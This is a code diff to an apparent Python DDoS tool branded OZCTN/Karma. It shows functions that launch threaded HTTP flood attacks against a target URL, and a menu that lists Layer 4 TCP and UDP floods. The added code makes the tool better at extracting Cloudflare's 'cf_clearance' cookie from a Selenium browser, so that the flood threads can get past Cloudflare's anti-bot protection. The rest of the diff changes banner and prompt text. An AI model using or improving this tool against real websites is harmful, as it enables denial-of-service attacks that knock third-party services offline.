@@ -240,6 +240,13 @@ def getcookie(url):
         cookies = driver.get_cookies()
         for i in cookies:
             if i['name'] == "cf_clearance":
+                cookieJAR = driver.get_cookies()[0]
+                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
+                if "cf_clearance" in cookie:
+                    pass
+                else:
+                    cookieJAR = driver.get_cookies()[1]
+                    cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                 driver.quit()
                 ii += 1
             else:
@@ -256,8 +263,6 @@ def LaunchCFPRO(url, th, t):
     for cookie in cookies:
         jar.set(cookie['name'], cookie['value'])
         scraper.cookies = jar
-    #stdout.write(jar)
-    print(jar)
     while threads_count <= int(th):
         try:
             thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
@@ -301,6 +306,11 @@ def LaunchCFSOC(url, th, t):
                 cookieJAR = driver.get_cookies()[0]
                 useragent = driver.execute_script("return navigator.userAgent")
                 cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
+                if "cf_clearance" in cookie:
+                        pass
+                else:
+                    cookieJAR = driver.get_cookies()[1]
+                    cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                 driver.quit()
                 ii += 1
             else:
@@ -378,15 +388,15 @@ def title():
     stdout.write("                                "+Fore.RED            +"╚═╝╚═╝╚═╝ ╩ ╝╚╝                \n")
     stdout.write("             "+Fore.RED            +"        ══╦═════════════════════════════════╦══\n")
     stdout.write("             \x1b[38;2;255;0;0m╔═════════╩═════════════════════════════════╩═════════╗\n")
-    stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m        Welcome To The Main Screen Of OZCTN\x1b[38;2;255;0;0m         ║\n")
+    stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m        Welcome To The Main Screen Of OZCTN\x1b[38;2;255;0;0m           ║\n")
     stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m          Type [help,?] To See The Commands    \x1b[38;2;255;0;0m       ║\n")
-    stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m         Instagram : @OZCTN   \x1b[38;2;255;0;0m       ║\n")
+    stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m         Contact Dev - Instagram : OZCTN   \x1b[38;2;255;0;0m           ║\n")
     stdout.write("             \x1b[38;2;255;0;0m╚═════════════════════════════════════════════════════╝\n")
     stdout.write("                                                                                          \n")
 
 def command():
-    #stdout.write(Fore.LIGHTMAGENTA_EX+"┌───"+Fore.MAGENTA+"("+Fore.LIGHTGREEN_EX+"@"+Fore.RED+namee+Fore.MAGENTA+")"+Fore.LIGHTGREEN_EX+"-"+Fore.MAGENTA+"["+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"root"+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"OZCTN"+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"]"+Fore.LIGHTMAGENTA_EX+"\n└──> "+Fore.WHITE)
-    stdout.write(Fore.LIGHTMAGENTA_EX+"╔═══"+Fore.MAGENTA+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.MAGENTA+"OZCTN"+Fore.MAGENTA+"]"+Fore.LIGHTMAGENTA_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
+    #stdout.write(Fore.LIGHTMAGENTA_EX+"┌───"+Fore.MAGENTA+"("+Fore.LIGHTGREEN_EX+"@"+Fore.RED+namee+Fore.MAGENTA+")"+Fore.LIGHTGREEN_EX+"-"+Fore.MAGENTA+"["+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"root"+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"KarmaSH"+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"]"+Fore.LIGHTMAGENTA_EX+"\n└──> "+Fore.WHITE)
+    stdout.write(Fore.LIGHTMAGENTA_EX+"╔═══"+Fore.MAGENTA+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.MAGENTA+"Karma"+Fore.MAGENTA+"]"+Fore.LIGHTMAGENTA_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
     command = input()
     if command == "cls":
         clear()
@@ -503,6 +513,7 @@ def func():
     stdout.write(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")
+    
     stdout.write(Fore.RED+" \n["+Fore.WHITE+"ETC.."+Fore.RED+"]\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"exit       "+Fore.RED+": "+Fore.WHITE+"Bye..\n")
